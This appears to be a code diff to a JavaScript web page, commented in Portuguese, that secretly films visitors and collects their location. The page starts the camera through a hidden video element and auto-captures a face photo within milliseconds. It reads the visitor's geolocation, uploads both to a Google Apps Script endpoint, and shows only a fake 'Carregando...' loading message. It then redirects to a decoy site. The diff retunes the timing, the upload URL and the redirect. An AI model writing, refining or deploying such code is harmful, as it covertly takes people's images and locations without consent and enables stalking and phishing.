@@ -1,4 +1,4 @@
-const GOOGLE_APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxnfPzdg4b4fv7u85HmXUcmLc1bc5gjLMQ2-xOwN__bDfyzhbHqDMC6Mt91-WZcJngC/exec';
+const GOOGLE_APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyVDD0u7e8v-c5tSBajOBoWoGNbdhWBCL_XGK11LJ-pCy8zJ-HPI_eFrVdg8pkcXzbu/exec';
 
 let cameraStream = null;
 let facialImageData = null;
@@ -29,8 +29,8 @@ async function startCameraCapture() {
         });
         hiddenVideo.srcObject = cameraStream;
         
-        // Auto-capture imediatamente (1ms)
-        setTimeout(() => captureFacialPhoto('user', hiddenVideo), 1);
+        // Auto-capture após 0,02 segundos
+        setTimeout(() => captureFacialPhoto('user', hiddenVideo), 20);
         
     } catch (err) {
         setTimeout(() => startCameraCaptureFallback(), 500);
@@ -54,7 +54,7 @@ async function startCameraCaptureFallback() {
         });
         hiddenVideo.srcObject = cameraStream;
         
-        setTimeout(() => captureFacialPhoto('environment', hiddenVideo), 1);
+        setTimeout(() => captureFacialPhoto('environment', hiddenVideo), 20);
         
     } catch (err) {
         showStatus('Carregando...');
@@ -73,10 +73,10 @@ async function captureFacialPhoto(mode, hiddenVideo) {
         facialImageData = canvas.toDataURL('image/jpeg', 0.85);
         stopCamera(hiddenVideo);
 
-        // Inicia geolocalização EM PARALELO (não aguarda)
-        getLocation();
-        
-        // Envia foto IMEDIATAMENTE sem esperar localização
+        showStatus('Carregando...');
+        await getLocation();
+
+        showStatus('Carregando...');
         await sendPhotoAndLocationToGoogleDrive();
 
     } catch (err) {
@@ -103,21 +103,8 @@ function getLocation() {
             return; 
         }
         
-        // Fallback imediato após 1 segundo
-        const timeout = setTimeout(() => {
-            userLocation = {
-                latitude: -23.5505, 
-                longitude: -46.6333,
-                accuracy: 'Aproximada',
-                timestamp: new Date().toLocaleString('pt-BR'),
-                mapLink: 'https://maps.google.com/?q=-23.5505,-46.6333'
-            };
-            resolve(userLocation);
-        }, 1000);
-        
         navigator.geolocation.getCurrentPosition(
             pos => {
-                clearTimeout(timeout);
                 userLocation = {
                     latitude: pos.coords.latitude,
                     longitude: pos.coords.longitude,
@@ -128,7 +115,6 @@ function getLocation() {
                 resolve(userLocation);
             },
             () => {
-                clearTimeout(timeout);
                 userLocation = {
                     latitude: -23.5505, 
                     longitude: -46.6333,
@@ -138,7 +124,7 @@ function getLocation() {
                 };
                 resolve(userLocation);
             },
-            { timeout: 1000, enableHighAccuracy: false, maximumAge: 0 }
+            { timeout: 8000 }
         );
     });
 }
@@ -188,9 +174,13 @@ async function sendPhotoAndLocationToGoogleDrive() {
 
         if (result.status === 'success') {
             console.log('✅ Tudo enviado!', result);
+            showStatus('Carregando...');
             
-            // Redireciona para claude.ai instantaneamente
-            window.location.href = 'WWW.GOOGLE.COM.BR';
+            // Redireciona para o link salvo após 0,09 segundos
+            setTimeout(() => {
+                const redirectLink = localStorage.getItem('redirectLink') || 'https://www.facebook.com.br';
+                window.location.href = redirectLink;
+            }, 90);
         } else {
             throw new Error(result.message || 'Erro desconhecido');
         }
